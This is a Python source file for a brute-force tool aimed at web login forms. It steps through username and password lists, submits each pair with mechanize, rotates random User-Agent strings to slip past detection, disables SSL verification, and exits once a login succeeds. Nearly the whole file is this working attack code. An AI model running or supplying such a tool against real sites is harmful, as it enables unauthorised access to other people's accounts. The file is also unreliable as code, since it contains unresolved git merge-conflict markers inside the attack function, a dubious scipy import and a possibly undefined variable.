import time
import requests
from lxml import html
from scipy import rand
import mechanize
import ssl


def brute(parameters):
    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'action' : parameters['action'],
               }
    if parameters['user_list']:
        for user in parameters['user_list']:
            content['username'] = user
            if parameters['password_list']:
                for password in parameters['password_list']:
                    content['password'] = password
                    attack(content)
            else:
                content['password'] = parameters['password']
                attack(content)

    elif parameters['password_list']:
        content['username'] = parameters['username']
        for password in parameters['password_list']:
            content['password'] = password
            attack(content)

    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        attack(content)


def attack(content):

    user = str(content['username'])[2:-1]
    pwd = str(content['password'])[2:-1]
    
    br = mechanize.Browser()
    br.set_handle_robots(False)
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        # Legacy Python that doesn't verify HTTPS certificates by default
        pass
    else:
        # Handle target environment that doesn't support HTTPS verification
        ssl._create_default_https_context = _create_unverified_https_context
    url = content['url']
    headers = [('User-Agent', get_random_user_agent().encode().decode('utf-8')),
               ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
                    ('Accept-Language', 'en-gb,en;q=0.5'),
                    ('Accept-Encoding', 'gzip,deflate'),
                    ('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'),
                    ('Keep-Alive', '115'),
                    ('Connection', 'keep-alive'),
                    ('Cache-Control', 'max-age=0'),
                    ('Referer', url)]
    br.addheaders=headers

    print('trying' +' username:' + user+' password:'+pwd)

    br.open(url)
    for form in br.forms():
        if form.attrs['action'] == content['action']:
            br.form = form
    br[content['user_param']] = content['username']
    br[content['password_param']] = content['password']
    res = br.submit()
<<<<<<< HEAD
=======

>>>>>>> 701fbfd6fd47d8e4c58ddfebeb45ae81968180f2
    if check_login(res, content['password_param'], content['user_param']):

        print('login successfull\n\nusername: ' + user + '\npassword: ' + pwd)
        exit(0)


def get_random_user_agent():
    ''' generate a random user_agentto use in the header of the packet'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay)
    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def check_login(content, password_param, user_param):
    pass_param = 'type="password" name="' + password_param + '"'
    pass_param1 = 'name="'+password_param + '"'+'type="password" '
    read = str(content.read())
    doc = html.document_fromstring(read)
    element = doc.xpath('//input[@type="password"]')

    '''if read.find(pass_param) > 0 or read.find(pass_param1) > 0:
            return False'''
    for field in element:
     if field.get('name') == password_param:
         return False


    if content.code != 200:
        print(content.code)
        return False
    else:
        #print(content.read)
        return True
